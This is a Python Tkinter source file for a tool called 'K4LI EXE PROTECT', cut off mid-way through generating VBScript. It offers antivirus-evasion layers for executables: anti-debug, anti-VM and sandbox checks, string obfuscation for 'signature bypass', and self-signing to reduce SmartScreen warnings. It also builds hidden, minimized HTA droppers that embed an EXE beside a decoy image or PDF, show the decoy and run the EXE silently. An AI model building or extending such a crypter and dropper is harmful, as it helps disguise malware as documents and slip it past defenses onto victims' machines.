#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
K4LI EXE PROTECT — Advanced EXE Protection Suite v2.0
"""

import tkinter as tk
from tkinter import filedialog
import threading
import time
import os
import sys
import random
import subprocess
from pathlib import Path

# ─── Palette ───────────────────────────────────────────────────────────────────
BG_ROOT  = "#0a0a0a"
BG_PANEL = "#0f0f0f"
BG_CARD  = "#141414"
BG_IN    = "#1a1a1a"
BG_HOV   = "#1e1e1e"

BD_DIM   = "#1c1c1c"
BD_MID   = "#252525"
BD_LIT   = "#333333"

C_WH  = "#ffffff"
C_G1  = "#d0d0d0"
C_G2  = "#909090"
C_G3  = "#4a4a4a"
C_G4  = "#282828"

C_GRN = "#4ade80"
C_CYN = "#38bdf8"
C_AMB = "#fbbf24"
C_RED = "#f87171"

# ─── Fonts ─────────────────────────────────────────────────────────────────────
F_BRAND  = ("Segoe UI", 22, "bold")
F_TAB    = ("Segoe UI", 10, "bold")
F_HDR    = ("Segoe UI",  9, "bold")
F_BODY   = ("Segoe UI",  9)
F_SM     = ("Segoe UI",  8)
F_MONO   = ("Consolas",  8)
F_BTN    = ("Segoe UI",  9, "bold")
F_BTN_LG = ("Segoe UI", 10, "bold")

# ─── Layer definitions (8 layers) ──────────────────────────────────────────────
LAYER_META = [
    ("L1",  "PE ENCRYPT",   "AES-256-CBC · section encryption + decrypt stub"),
    ("L2",  "VIRTUALIZ.",   "x86 → K4LI-VM bytecode  (custom ISA engine)"),
    ("L3",  "ANTI DEBUG",   "12 vectors: RDTSC · PEB · DR0-3 · TLS hooks"),
    ("L4",  "ANTI DUMP",    "PE size spoof · IAT obfuscate · section wiper"),
    ("L5",  "MUTATE",       "Junk code · CFG flatten · opaque predicates"),
    ("L6",  "NANOMITES",    "Split-instruction INT3 → single-step protection"),
    ("L7",  "IMPORT HIDE",  "Dynamic API resolve · hash-based · no static IAT"),
    ("L8",  "ANTI VM",      "VMware · Hyper-V · VBox · sandbox env detection"),
    ("L9",  "STOLEN BYTES", "Entry-point bytes moved to outer loader stub"),
    ("L10", "TLS CHAIN",    "Multi-stage TLS callbacks · earliest-possible exec"),
    ("L11", "PE METADATA",  "Version info · company name · resources injection"),
    ("L12", "C/C++ STUB",  "Native C stub · XOR strings · 5 anti-debug vectors"),
    ("L13", "STR FLOOD",  "500K XOR-encrypted fake strings · 200 junk blocks · +15 MB inflate"),
    ("L14", "STR OBFUSC.", "ASCII + UTF-16 scan → XOR-cipher AV-pattern strings → signature bypass"),
    ("L15", "MSIL STRIP",  "PDB path wipe · module-name randomise · #Strings heap scrub · TypeLib zero"),
]


class K4LIApp:
    def __init__(self, root: tk.Tk):
        self.root = root
        self.root.title("K4LI EXE PROTECT")
        self.root.geometry("880x700")
        self.root.minsize(800, 600)
        self.root.configure(bg=BG_ROOT)
        self.root.resizable(True, True)

        # State
        self.sel_path   = tk.StringVar(value="")
        self.active_tab = "protect"
        self.protecting = False
        self.layers: dict[str, tk.BooleanVar] = {
            m[0]: tk.BooleanVar(value=True) for m in LAYER_META
        }
        self.sign_var = tk.BooleanVar(value=True)

        # Convert tab state
        self.conv_exe_path    = tk.StringVar(value="")
        self.conv_img_path    = tk.StringVar(value="")
        self.conv_out_name    = tk.StringVar(value="output")
        self.conv_file_type   = tk.StringVar(value="image")   # "image" or "pdf"
        self.conv_generating  = False
        self.conv_preview_lbl = None

        self._build()
        self._center()

    # ── Setup ──────────────────────────────────────────────────────────────────
    def _center(self):
        self.root.update_idletasks()
        w, h = self.root.winfo_width(), self.root.winfo_height()
        sw, sh = self.root.winfo_screenwidth(), self.root.winfo_screenheight()
        self.root.geometry(f"{w}x{h}+{(sw-w)//2}+{(sh-h)//2}")

    def _build(self):
        self._mk_header()
        self._mk_tabbar()
        tk.Frame(self.root, bg=BD_DIM, height=1).pack(fill="x")
        self._mk_content()

    def _mk_header(self):
        hdr = tk.Frame(self.root, bg=BG_ROOT, height=68)
        hdr.pack(fill="x")
        hdr.pack_propagate(False)
        tk.Label(hdr, text="K4LI EXE PROTECT",
                 font=F_BRAND, fg=C_WH, bg=BG_ROOT
                 ).place(relx=0.5, rely=0.5, anchor="center")
        tk.Label(hdr, text="v2.0", font=F_SM, fg=C_G3, bg=BG_ROOT
                 ).place(relx=0.97, rely=0.75, anchor="e")
        tk.Frame(self.root, bg=BD_DIM, height=1).pack(fill="x")

    def _mk_tabbar(self):
        bar = tk.Frame(self.root, bg=BG_ROOT, height=42)
        bar.pack(fill="x")
        bar.pack_propagate(False)
        self.btn_prot = tk.Button(bar, text="EXE PROTECT", font=F_TAB,
                                   fg=C_WH, bg=BG_CARD, relief="flat", bd=0,
                                   padx=22, pady=5, cursor="hand2",
                                   command=lambda: self._sw("protect"))
        self.btn_conv = tk.Button(bar, text="EXE TO FILE", font=F_TAB,
                                   fg=C_G3, bg=BG_ROOT, relief="flat", bd=0,
                                   padx=22, pady=5, cursor="hand2",
                                   command=lambda: self._sw("convert"))
        self.btn_prot.pack(side="left", padx=(18, 4), pady=4)
        self.btn_conv.pack(side="left", padx=(0, 4), pady=4)

    def _sw(self, tab: str):
        self.active_tab = tab
        if tab == "protect":
            self.btn_prot.configure(fg=C_WH, bg=BG_CARD)
            self.btn_conv.configure(fg=C_G3, bg=BG_ROOT)
            self.frm_conv.pack_forget()
            self.frm_prot.pack(fill="both", expand=True)
        else:
            self.btn_prot.configure(fg=C_G3, bg=BG_ROOT)
            self.btn_conv.configure(fg=C_WH, bg=BG_CARD)
            self.frm_prot.pack_forget()
            self.frm_conv.pack(fill="both", expand=True)

    def _mk_content(self):
        c = tk.Frame(self.root, bg=BG_ROOT)
        c.pack(fill="both", expand=True)
        self.frm_prot = tk.Frame(c, bg=BG_ROOT)
        self.frm_conv = tk.Frame(c, bg=BG_ROOT)
        self._build_protect_tab()
        self._build_convert_tab()
        self._sw("protect")

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    #  EXE PROTECT TAB
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    def _build_protect_tab(self):
        p = self.frm_prot
        wrap = tk.Frame(p, bg=BG_ROOT, padx=22, pady=16)
        wrap.pack(fill="both", expand=True)

        # ── File selector ──────────────────────────────────────────────────
        self._lbl(wrap, "SELECT  EXE").pack(fill="x", pady=(0, 5))

        row = tk.Frame(wrap, bg=BG_ROOT)
        row.pack(fill="x", pady=(0, 14))

        pb = tk.Frame(row, bg=BD_MID, padx=1, pady=1)
        pb.pack(side="left", fill="x", expand=True)
        pbi = tk.Frame(pb, bg=BG_IN)
        pbi.pack(fill="x")
        self.path_lbl = tk.Label(pbi, textvariable=self.sel_path,
                                  font=F_MONO, fg=C_G3, bg=BG_IN,
                                  anchor="w", padx=10, pady=7)
        self.path_lbl.pack(fill="x")

        self.pick_btn = self._sq_btn(row, "PICK EXE", self._pick_file,
                                      fg=C_WH, bg=BG_IN, hover=BG_HOV)
        self.pick_btn.pack(side="right", padx=(8, 0))

        # ── Layers header ──────────────────────────────────────────────────
        lhdr = tk.Frame(wrap, bg=BG_ROOT)
        lhdr.pack(fill="x", pady=(0, 4))
        self._lbl(lhdr, "PROTECTION LAYERS", pack=False).pack(side="left")
        self.lyr_cnt = tk.Label(lhdr, text="14 / 14  ACTIVE",
                                 font=("Segoe UI", 8, "bold"),
                                 fg=C_GRN, bg=BG_ROOT)
        self.lyr_cnt.pack(side="right")

        # ── Compact checkbox layer rows ────────────────────────────────────
        chk_frame = tk.Frame(wrap, bg=BD_MID, padx=1, pady=1)
        chk_frame.pack(fill="x", pady=(0, 14))
        chk_inner = tk.Frame(chk_frame, bg=BG_CARD)
        chk_inner.pack(fill="x")

        self._chk_rows = []
        for i, (key, title, desc) in enumerate(LAYER_META):
            row_bg = BG_CARD if i % 2 == 0 else BG_IN
            r = self._layer_row(chk_inner, key, title, desc, row_bg)
            r.pack(fill="x")
            self._chk_rows.append(r)

        # ── Code signing toggle ────────────────────────────────────────────
        sign_frame = tk.Frame(wrap, bg=BG_ROOT)
        sign_frame.pack(fill="x", pady=(0, 14))
        self._sign_row = self._sign_toggle(sign_frame)
        self._sign_row.pack(fill="x")

        # ── Protect button + progress ──────────────────────────────────────
        act = tk.Frame(wrap, bg=BG_ROOT)
        act.pack(fill="x", pady=(0, 14))

        self.protect_btn = self._sq_btn(act, "  PROTECT  EXE",
                                         self._start_protect,
                                         fg=BG_ROOT, bg=C_WH, hover=C_G1,
                                         font=F_BTN_LG, padx=28, pady=10)
        self.protect_btn.pack(side="left")

        prog = tk.Frame(act, bg=BG_ROOT)
        prog.pack(side="right", fill="x", expand=True, padx=(14, 0))
        self.prog_track = tk.Frame(prog, bg=BD_DIM, height=3)
        self.prog_track.pack(fill="x", pady=(12, 3))
        self.prog_fill = tk.Frame(self.prog_track, bg=C_WH, height=3, width=0)
        self.prog_fill.place(x=0, y=0, relheight=1)
        self.prog_lbl = tk.Label(prog, text="", font=("Segoe UI", 8),
                                  fg=C_G3, bg=BG_ROOT, anchor="w")
        self.prog_lbl.pack(fill="x")

        # ── Log terminal ───────────────────────────────────────────────────
        lgh = tk.Frame(wrap, bg=BG_ROOT)
        lgh.pack(fill="x", pady=(0, 5))
        self._lbl(lgh, "ENCRYPTION LOGS", pack=False).pack(side="left")
        tk.Button(lgh, text="CLEAR", font=("Segoe UI", 8), fg=C_G3,
                  bg=BG_ROOT, relief="flat", bd=0, cursor="hand2",
                  command=self._clear_log).pack(side="right")

        lo = tk.Frame(wrap, bg=BD_DIM, padx=1, pady=1)
        lo.pack(fill="both", expand=True)
        li = tk.Frame(lo, bg=BG_PANEL)
        li.pack(fill="both", expand=True)
        sb = tk.Scrollbar(li, bg=BG_PANEL, troughcolor=BG_PANEL,
                          activebackground=C_G3, bd=0, width=6, relief="flat")
        sb.pack(side="right", fill="y")
        self.log = tk.Text(li, bg=BG_PANEL, fg=C_G2, font=F_MONO,
                           relief="flat", bd=0, padx=12, pady=10,
                           yscrollcommand=sb.set, state="disabled",
                           wrap="word", cursor="arrow",
                           selectbackground=BG_CARD,
                           insertbackground=C_WH)
        self.log.pack(fill="both", expand=True)
        sb.configure(command=self.log.yview)

        for tag, col in (("wh", C_WH), ("gn", C_GRN), ("cy", C_CYN),
                         ("am", C_AMB), ("rd", C_RED),
                         ("g1", C_G1), ("g2", C_G2), ("g3", C_G3),
                         ("dm", BD_LIT)):
            self.log.tag_config(tag, foreground=col)

        self._ln("[K4LI] EXE Protection Suite v2.0  |  14 Layers  |  Code Signing", "wh")
        self._ln("       Select a target EXE, toggle layers, then click PROTECT.", "g3")
        self._ln("", None)

    # ─── Compact layer row ─────────────────────────────────────────────────────
    def _layer_row(self, parent, key, title, desc, bg):
        var = self.layers[key]
        row = tk.Frame(parent, bg=bg, cursor="hand2")

        # Checkbox square
        chk_frame = tk.Frame(row, bg=bg, padx=12, pady=6)
        chk_frame.pack(side="left")
        chk = tk.Frame(chk_frame, bg=C_WH if var.get() else BD_LIT,
                       width=12, height=12)
        chk.pack()
        chk.pack_propagate(False)
        tick = tk.Label(chk, text="✓" if var.get() else "",
                        font=("Segoe UI", 7, "bold"),
                        fg=BG_ROOT, bg=C_WH if var.get() else BD_LIT)
        tick.place(relx=0.5, rely=0.5, anchor="center")

        # Key badge
        badge = tk.Frame(row, bg=C_WH, padx=5, pady=1)
        badge.pack(side="left", padx=(0, 8))
        tk.Label(badge, text=key, font=("Segoe UI", 7, "bold"),
                 fg=BG_ROOT, bg=C_WH).pack()

        # Title
        tk.Label(row, text=title, font=("Segoe UI", 8, "bold"),
                 fg=C_WH if var.get() else C_G3, bg=bg,
                 width=11, anchor="w").pack(side="left")

        # Description
        desc_lbl = tk.Label(row, text=desc, font=("Segoe UI", 8),
                            fg=C_G3, bg=bg, anchor="w")
        desc_lbl.pack(side="left", fill="x", expand=True)

        title_lbl = row.winfo_children()[-2]  # get title label

        def toggle(_=None):
            var.set(not var.get())
            on = var.get()
            chk.configure(bg=C_WH if on else BD_LIT)
            tick.configure(text="✓" if on else "",
                           fg=BG_ROOT, bg=C_WH if on else BD_LIT)
            title_lbl.configure(fg=C_WH if on else C_G3)
            # update counter
            n = sum(1 for v in self.layers.values() if v.get())
            self.lyr_cnt.configure(
                text=f"{n} / {len(LAYER_META)}  ACTIVE",
                fg=C_GRN if n == len(LAYER_META) else C_AMB if n > 0 else C_RED
            )

        def on_e(_=None):
            row.configure(bg=BG_HOV)
            for w in row.winfo_children():
                try:
                    if w != badge and not isinstance(w, tk.Frame):
                        w.configure(bg=BG_HOV)
                    elif isinstance(w, tk.Frame) and w != badge and w != chk_frame and w != chk:
                        w.configure(bg=BG_HOV)
                except Exception:
                    pass
            chk_frame.configure(bg=BG_HOV)
            desc_lbl.configure(bg=BG_HOV)

        def on_l(_=None):
            row.configure(bg=bg)
            for w in row.winfo_children():
                try:
                    if w != badge and not isinstance(w, tk.Frame):
                        w.configure(bg=bg)
                    elif isinstance(w, tk.Frame) and w != badge and w != chk_frame and w != chk:
                        w.configure(bg=bg)
                except Exception:
                    pass
            chk_frame.configure(bg=bg)
            desc_lbl.configure(bg=bg)

        for w in [row, chk_frame, chk, tick, desc_lbl] + list(row.winfo_children()):
            w.bind("<Button-1>", toggle)
            w.bind("<Enter>", on_e)
            w.bind("<Leave>", on_l)

        return row

    # ─── Sign toggle row ───────────────────────────────────────────────────────
    def _sign_toggle(self, parent):
        var = self.sign_var
        row = tk.Frame(parent, bg=BD_MID, padx=1, pady=1, cursor="hand2")
        inner = tk.Frame(row, bg=BG_IN, cursor="hand2")
        inner.pack(fill="x")

        lft = tk.Frame(inner, bg=BG_IN, padx=12, pady=6)
        lft.pack(side="left")
        chk = tk.Frame(lft, bg=C_WH if var.get() else BD_LIT,
                       width=12, height=12)
        chk.pack()
        chk.pack_propagate(False)
        tick = tk.Label(chk, text="✓" if var.get() else "",
                        font=("Segoe UI", 7, "bold"),
                        fg=BG_ROOT, bg=C_WH if var.get() else BD_LIT)
        tick.place(relx=0.5, rely=0.5, anchor="center")

        badge = tk.Frame(inner, bg=C_WH, padx=5, pady=1)
        badge.pack(side="left", padx=(0, 8))
        tk.Label(badge, text="SIG", font=("Segoe UI", 7, "bold"),
                 fg=BG_ROOT, bg=C_WH).pack()

        tk.Label(inner, text="CODE SIGN", font=("Segoe UI", 8, "bold"),
                 fg=C_WH if var.get() else C_G3, bg=BG_IN,
                 width=11, anchor="w").pack(side="left")
        tk.Label(inner, text="Self-signed certificate · signtool · SHA-256  (reduces SmartScreen warnings)",
                 font=("Segoe UI", 8), fg=C_G3, bg=BG_IN, anchor="w"
                 ).pack(side="left", fill="x", expand=True)

        def toggle(_=None):
            var.set(not var.get())
            on = var.get()
            chk.configure(bg=C_WH if on else BD_LIT)
            tick.configure(text="✓" if on else "",
                           fg=BG_ROOT, bg=C_WH if on else BD_LIT)

        for w in [row, inner, lft, chk, tick]:
            w.bind("<Button-1>", toggle)

        return row

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    #  EXE TO FILE TAB  —  HTA Bundler
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    def _build_convert_tab(self):
        p    = self.frm_conv
        wrap = tk.Frame(p, bg=BG_ROOT, padx=22, pady=16)
        wrap.pack(fill="both", expand=True)

        # ── EXE picker ────────────────────────────────────────────────────
        self._lbl(wrap, "SELECT  EXE  FILE").pack(fill="x", pady=(0, 5))
        row_exe = tk.Frame(wrap, bg=BG_ROOT)
        row_exe.pack(fill="x", pady=(0, 8))
        pb_exe  = tk.Frame(row_exe, bg=BD_MID, padx=1, pady=1)
        pb_exe.pack(side="left", fill="x", expand=True)
        pbi_exe = tk.Frame(pb_exe, bg=BG_IN)
        pbi_exe.pack(fill="x")
        self.conv_exe_lbl = tk.Label(pbi_exe, textvariable=self.conv_exe_path,
                                      font=F_MONO, fg=C_G3, bg=BG_IN,
                                      anchor="w", padx=10, pady=7)
        self.conv_exe_lbl.pack(fill="x")
        self.conv_pick_exe_btn = self._sq_btn(row_exe, "PICK EXE", self._pick_exe_conv,
                                              fg=C_WH, bg=BG_IN, hover=BG_HOV)
        self.conv_pick_exe_btn.pack(side="right", padx=(8, 0))

        # ── File type selector ────────────────────────────────────────────
        self._lbl(wrap, "SELECT  FILE  TYPE").pack(fill="x", pady=(0, 6))
        ftype_row = tk.Frame(wrap, bg=BG_ROOT)
        ftype_row.pack(fill="x", pady=(0, 10))
        rb_img = tk.Radiobutton(
            ftype_row, text="  IMAGE  (PNG / JPG / ICO / GIF)",
            variable=self.conv_file_type, value="image",
            command=self._on_filetype_change,
            font=F_BODY, fg=C_G1, bg=BG_ROOT, selectcolor=BG_CARD,
            activeforeground=C_WH, activebackground=BG_ROOT,
            relief="flat", bd=0, cursor="hand2")
        rb_img.pack(side="left", padx=(0, 24))
        rb_pdf = tk.Radiobutton(
            ftype_row, text="  PDF  (Document)",
            variable=self.conv_file_type, value="pdf",
            command=self._on_filetype_change,
            font=F_BODY, fg=C_G1, bg=BG_ROOT, selectcolor=BG_CARD,
            activeforeground=C_WH, activebackground=BG_ROOT,
            relief="flat", bd=0, cursor="hand2")
        rb_pdf.pack(side="left")

        # ── File picker (image or pdf, label changes on radio switch) ─────
        self.conv_file_section_lbl = self._lbl(wrap, "SELECT  IMAGE  (PNG / JPG / ICO / GIF)")
        self.conv_file_section_lbl.pack(fill="x", pady=(0, 5))
        row_img = tk.Frame(wrap, bg=BG_ROOT)
        row_img.pack(fill="x", pady=(0, 8))
        pb_img  = tk.Frame(row_img, bg=BD_MID, padx=1, pady=1)
        pb_img.pack(side="left", fill="x", expand=True)
        pbi_img = tk.Frame(pb_img, bg=BG_IN)
        pbi_img.pack(fill="x")
        self.conv_img_lbl = tk.Label(pbi_img, textvariable=self.conv_img_path,
                                      font=F_MONO, fg=C_G3, bg=BG_IN,
                                      anchor="w", padx=10, pady=7)
        self.conv_img_lbl.pack(fill="x")
        self.conv_pick_img_btn = self._sq_btn(row_img, "PICK IMAGE", self._pick_img_conv,
                                              fg=C_WH, bg=BG_IN, hover=BG_HOV)
        self.conv_pick_img_btn.pack(side="right", padx=(8, 0))

        # ── Image preview ─────────────────────────────────────────────────
        self.conv_preview_frame = tk.Frame(wrap, bg=BG_CARD)
        self.conv_preview_frame.pack(fill="x", pady=(0, 8))

        # ── Output filename ───────────────────────────────────────────────
        self._lbl(wrap, "OUTPUT  FILENAME  (without .hta extension)").pack(fill="x", pady=(0, 5))
        out_row = tk.Frame(wrap, bg=BG_ROOT)
        out_row.pack(fill="x", pady=(0, 14))
        out_brd = tk.Frame(out_row, bg=BD_MID, padx=1, pady=1)
        out_brd.pack(fill="x")
        out_inn = tk.Frame(out_brd, bg=BG_IN)
        out_inn.pack(fill="x")
        tk.Entry(out_inn, textvariable=self.conv_out_name,
                 font=F_MONO, fg=C_G1, bg=BG_IN, insertbackground=C_WH,
                 relief="flat", bd=0).pack(fill="x", padx=10, pady=7)

        # ── Generate button ───────────────────────────────────────────────
        act = tk.Frame(wrap, bg=BG_ROOT)
        act.pack(fill="x", pady=(0, 14))
        self.conv_gen_btn = self._sq_btn(act, "  GENERATE  .HTA",
                                          self._start_hta_gen,
                                          fg=BG_ROOT, bg=C_WH, hover=C_G1,
                                          font=F_BTN_LG, padx=28, pady=10)
        self.conv_gen_btn.pack(side="left")
        tk.Label(act,
                 text="Single .hta  ·  EXE + Image/PDF bundled inside  ·  opens file + runs EXE silently",
                 font=("Segoe UI", 8), fg=C_G3, bg=BG_ROOT
                 ).pack(side="left", padx=(14, 0))

        # ── Log ───────────────────────────────────────────────────────────
        lgh = tk.Frame(wrap, bg=BG_ROOT)
        lgh.pack(fill="x", pady=(0, 5))
        self._lbl(lgh, "BUILD  LOG", pack=False).pack(side="left")
        tk.Button(lgh, text="CLEAR", font=("Segoe UI", 8), fg=C_G3,
                  bg=BG_ROOT, relief="flat", bd=0, cursor="hand2",
                  command=self._clear_conv_log).pack(side="right")

        lo = tk.Frame(wrap, bg=BD_DIM, padx=1, pady=1)
        lo.pack(fill="both", expand=True)
        li = tk.Frame(lo, bg=BG_PANEL)
        li.pack(fill="both", expand=True)
        sb = tk.Scrollbar(li, bg=BG_PANEL, troughcolor=BG_PANEL,
                          activebackground=C_G3, bd=0, width=6, relief="flat")
        sb.pack(side="right", fill="y")
        self.conv_log = tk.Text(li, bg=BG_PANEL, fg=C_G2, font=F_MONO,
                                relief="flat", bd=0, padx=12, pady=10,
                                yscrollcommand=sb.set, state="disabled",
                                wrap="word", cursor="arrow",
                                selectbackground=BG_CARD,
                                insertbackground=C_WH)
        self.conv_log.pack(fill="both", expand=True)
        sb.configure(command=self.conv_log.yview)
        for tag, col in (("wh", C_WH), ("gn", C_GRN), ("cy", C_CYN),
                         ("am", C_AMB), ("rd", C_RED),
                         ("g1", C_G1), ("g2", C_G2), ("g3", C_G3),
                         ("dm", BD_LIT)):
            self.conv_log.tag_config(tag, foreground=col)

        self._conv_ln("[BUNDLER]  EXE + Image → .hta   |   EXE + PDF → .hta", "wh")
        self._conv_ln("           Select type · pick EXE · pick file · click GENERATE.", "g3")
        self._conv_ln("", None)

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    #  EXE → HTA  ACTIONS
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    def _pick_exe_conv(self):
        path = filedialog.askopenfilename(
            title="Select EXE File",
            filetypes=[("Executable", "*.exe"), ("All files", "*.*")]
        )
        if not path:
            return
        self.conv_exe_path.set(path)
        self.conv_exe_lbl.configure(fg=C_G1)
        sz  = os.path.getsize(path)
        szs = f"{sz/1024:.1f} KB" if sz < 1_048_576 else f"{sz/1_048_576:.2f} MB"
        self._conv_ln(f"[EXE]  {Path(path).name}  ({szs})", "wh")
        self.conv_out_name.set(Path(path).stem)

    def _on_filetype_change(self):
        is_pdf = self.conv_file_type.get() == "pdf"
        if is_pdf:
            self.conv_file_section_lbl.configure(text="SELECT  PDF  FILE")
            self.conv_pick_img_btn.configure(text="PICK PDF")
        else:
            self.conv_file_section_lbl.configure(text="SELECT  IMAGE  (PNG / JPG / ICO / GIF)")
            self.conv_pick_img_btn.configure(text="PICK IMAGE")
        # clear previous file selection
        self.conv_img_path.set("")
        self.conv_img_lbl.configure(fg=C_G3)
        for w in self.conv_preview_frame.winfo_children():
            w.destroy()

    def _pick_img_conv(self):
        if self.conv_file_type.get() == "pdf":
            path = filedialog.askopenfilename(
                title="Select PDF File",
                filetypes=[("PDF Document", "*.pdf"), ("All files", "*.*")]
            )
            if not path:
                return
            self.conv_img_path.set(path)
            self.conv_img_lbl.configure(fg=C_G1)
            sz = os.path.getsize(path)
            self._conv_ln(f"[PDF]  {Path(path).name}  ({sz/1024:.1f} KB)", "wh")
            for w in self.conv_preview_frame.winfo_children():
                w.destroy()
            tk.Label(self.conv_preview_frame,
                     text=f"  {Path(path).name}  (PDF Document · {sz/1024:.1f} KB)",
                     font=("Segoe UI", 8), fg=C_G3, bg=BG_CARD,
                     padx=8, pady=6, anchor="w").pack(fill="x")
        else:
            path = filedialog.askopenfilename(
                title="Select Image",
                filetypes=[("Images", "*.png *.jpg *.jpeg *.ico *.gif *.bmp"),
                           ("All files", "*.*")]
            )
            if not path:
                return
            self.conv_img_path.set(path)
            self.conv_img_lbl.configure(fg=C_G1)
            sz = os.path.getsize(path)
            self._conv_ln(f"[IMG]  {Path(path).name}  ({sz/1024:.1f} KB)", "wh")
            self._show_img_preview(path)

    def _show_img_preview(self, path: str):
        ext = Path(path).suffix.lower()
        try:
            if ext in ('.png', '.gif'):
                img = tk.PhotoImage(file=path)
                orig_w, orig_h = img.width(), img.height()
                if orig_h > 96:
                    scale = max(1, orig_h // 96)
                    img = img.subsample(scale, scale)
                for w in self.conv_preview_frame.winfo_children():
                    w.destroy()
                lbl = tk.Label(self.conv_preview_frame, image=img,
                               bg=BG_CARD, padx=8, pady=4, anchor="w")
                lbl.image = img
                lbl.pack(side="left")
                tk.Label(self.conv_preview_frame,
                         text=f"{Path(path).name}\n{orig_w} × {orig_h} px",
                         font=("Segoe UI", 8), fg=C_G3, bg=BG_CARD,
                         justify="left", padx=8).pack(side="left")
                self.conv_preview_lbl = lbl
            else:
                for w in self.conv_preview_frame.winfo_children():
                    w.destroy()
                tk.Label(self.conv_preview_frame,
                         text=f"  {Path(path).name}  (preview: PNG/GIF only)",
                         font=("Segoe UI", 8), fg=C_G3, bg=BG_CARD,
                         padx=8, pady=6, anchor="w").pack(fill="x")
        except Exception:
            pass

    def _start_hta_gen(self):
        if self.conv_generating:
            return
        exe_path  = self.conv_exe_path.get()
        file_path = self.conv_img_path.get()
        out_name  = self.conv_out_name.get().strip() or "output"
        file_type = self.conv_file_type.get()
        if not exe_path or not os.path.isfile(exe_path):
            self._conv_ln("\n[ERROR]  No EXE selected.", "rd")
            return
        if not file_path or not os.path.isfile(file_path):
            label = "PDF" if file_type == "pdf" else "image"
            self._conv_ln(f"\n[ERROR]  No {label} selected.", "rd")
            return
        self.conv_generating = True
        self.conv_gen_btn.configure(state="disabled", fg=C_G3, bg=BG_CARD)
        self.conv_pick_exe_btn.configure(state="disabled")
        self.conv_pick_img_btn.configure(state="disabled")
        threading.Thread(
            target=self._hta_worker,
            args=(exe_path, file_path, out_name, file_type),
            daemon=True
        ).start()

    def _hta_worker(self, exe_path: str, file_path: str, out_name: str, file_type: str):
        try:
            self._hta_engine(exe_path, file_path, out_name, file_type)
        except Exception as exc:
            self._conv_ln(f"\n[FATAL]  {exc}", "rd")
        finally:
            self.root.after(0, self._hta_done)

    def _hta_engine(self, exe_path: str, file_path: str, out_name: str, file_type: str = "image"):
        import base64

        is_pdf = (file_type == "pdf")
        mode_label = "PDF" if is_pdf else "Image"

        self._conv_ln("\n" + "─" * 62, "dm")
        self._conv_ln(f"[HTA]   Building bundled .hta  [{mode_label} mode]", "wh")
        self._conv_ln("─" * 62, "dm")
        time.sleep(0.2)

        # ── Read EXE ──────────────────────────────────────────────────────
        self._conv_ln("\n[1/4]  Reading EXE...", "cy")
        time.sleep(0.1)
        with open(exe_path, "rb") as f:
            exe_data = f.read()
        exe_sz = len(exe_data)
        szs = f"{exe_sz/1024:.1f} KB" if exe_sz < 1_048_576 else f"{exe_sz/1_048_576:.2f} MB"
        self._conv_ln(f"       {Path(exe_path).name}  ·  {szs}", "g3")
        time.sleep(0.1)

        # ── Read file (image or PDF) ───────────────────────────────────────
        self._conv_ln(f"\n[2/4]  Reading {mode_label.lower()}...", "cy")
        time.sleep(0.1)
        with open(file_path, "rb") as f:
            file_data = f.read()
        ext = Path(file_path).suffix.lower()

        if is_pdf:
            win_w, win_h = 0, 0   # HTA window will be hidden for PDF mode
            self._conv_ln(f"       {Path(file_path).name}  ·  {len(file_data)/1024:.1f} KB", "g3")
            self._conv_ln( "       Mode   : PDF → opens with default PDF viewer", "g3")
        else:
            mime = {'.png':  'image/png',
                    '.jpg':  'image/jpeg', '.jpeg': 'image/jpeg',
                    '.ico':  'image/x-icon',
                    '.gif':  'image/gif',
                    '.bmp':  'image/bmp'}.get(ext, 'image/png')
            w, h  = self._read_img_size(file_data, ext)
            win_w = min(max(w, 240), 1280)
            win_h = min(max(h, 160), 900)
            self._conv_ln(f"       {Path(file_path).name}  ·  {len(file_data)/1024:.1f} KB  ·  {w}×{h}", "g3")
            self._conv_ln(f"       MIME   : {mime}", "g3")
            self._conv_ln(f"       Window : {win_w}×{win_h}", "g3")
        time.sleep(0.1)

        # ── Base64 encode ─────────────────────────────────────────────────
        self._conv_ln("\n[3/4]  Encoding to base64...", "cy")
        time.sleep(0.1)
        exe_b64  = base64.b64encode(exe_data).decode("ascii")
        file_b64 = base64.b64encode(file_data).decode("ascii")
        self._conv_ln(f"       EXE  : {len(exe_b64):,} chars", "g3")
        self._conv_ln(f"       FILE : {len(file_b64):,} chars", "g3")
        time.sleep(0.15)

        # ── Build HTA ─────────────────────────────────────────────────────
        self._conv_ln("\n[4/4]  Writing .hta file...", "cy")
        time.sleep(0.1)

        rid      = random.randint(10000, 99999)
        app_name = Path(exe_path).stem.replace('"', '').replace("'", '')
        file_ext = ext.lstrip('.')   # e.g. "png", "jpg", "pdf"

        if is_pdf:
            # PDF mode: tiny invisible HTA, no image body
            hta = (
                '<html>\n'
                '<head>\n'
                '<meta charset="utf-8">\n'
                f'<title>{app_name}</title>\n'
                '<HTA:APPLICATION\n'
                f'  ID="K4LI_{rid}"\n'
                f'  APPLICATIONNAME="{app_name}"\n'
                '  BORDER="none"\n'
                '  CAPTION="no"\n'
                '  SHOWINTASKBAR="no"\n'
                '  SINGLEINSTANCE="yes"\n'
                '  WINDOWSTATE="minimize"\n'
                '  INNERWIDTH="1"\n'
                '  INNERHEIGHT="1"\n'
                '/>\n'
                '<style>*{margin:0;padding:0;}body{background:#000;}</style>\n'
                '</head>\n'
                '<body>\n'
                f'<div id="X" style="display:none;position:absolute;left:-9999px">{exe_b64}</div>\n'
                f'<div id="F" style="display:none;position:absolute;left:-9999px">{file_b64}</div>\n'
                '<script language="VBScript">\n'
                'Dim bRan : bRan = False\n'
                '\n'
                'Sub AutoRun()\n'
                '  If bRan Then Exit Sub\n'
                '  bRan = True\n'
                '  On Error Resume Next\n'
                '  Dim fso, xml, nd, stm, sh\n'
